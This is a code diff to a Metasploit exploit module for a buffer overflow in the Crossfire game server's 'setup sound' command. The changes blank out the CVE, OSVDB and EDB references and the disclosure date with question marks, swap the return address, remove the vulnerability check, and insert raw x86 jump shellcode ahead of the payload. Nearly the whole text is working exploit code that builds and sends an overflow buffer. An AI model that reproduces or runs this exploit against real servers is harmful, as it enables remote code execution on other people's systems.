@@ -14,9 +14,9 @@ def initialize(info = {})
       'Platform'	=> 'linux',
       'References'	=>
         [
-          [ 'CVE', '2006-1236' ],
-          [ 'OSVDB', '2006-1236' ],
-          [ 'EDB', '1582' ]
+          [ 'CVE', '?????' ],
+          [ 'OSVDB', '?????' ],
+          [ 'EDB', '?????' ]
         ],
       'Privileged'	=> false,
       'License'	=> MSF_LICENSE,
@@ -27,10 +27,10 @@ def initialize(info = {})
         },
       'Targets'	=>
         [
-          [ 'linux', { 'Ret' => 0x0807b918 } ],
+          [ 'linux', { 'Ret' => 0x08134597 } ],
         ],
       'DefaultTarget'	=> 0,
-      'DisclosureDate'  => 'Mar 13 2006'
+      'DisclosureDate'  => '?????'
     ))
 
     register_options(
@@ -41,27 +41,16 @@ def initialize(info = {})
     )
   end
 
-def check
-connect
-disconnect
-
-     if (banner =~ /version 1023 1027 Crossfire Server/)
-	return Exploit::CheckCode::Vulnerable
-     end
-     return Exploit::CheckCode::Safe
-
-  end
 
   def exploit
     connect
 
 
     sploit = "\x11(setup sound "
-    sploit << rand_text_alpha_upper(91)
     sploit << payload.encoded
-    sploit << rand_text_alpha_upper(4277 - payload.encoded.length)
+    sploit << rand_text_alpha_upper(4368 - payload.encoded.length)
     sploit << [target.ret].pack('V')
-    sploit << "C" * 7
+    sploit << "\x83\xc0\x0c\xff\xe0\x90\x90"
     sploit << "\x90\x00#"
 
     sock.put(sploit)
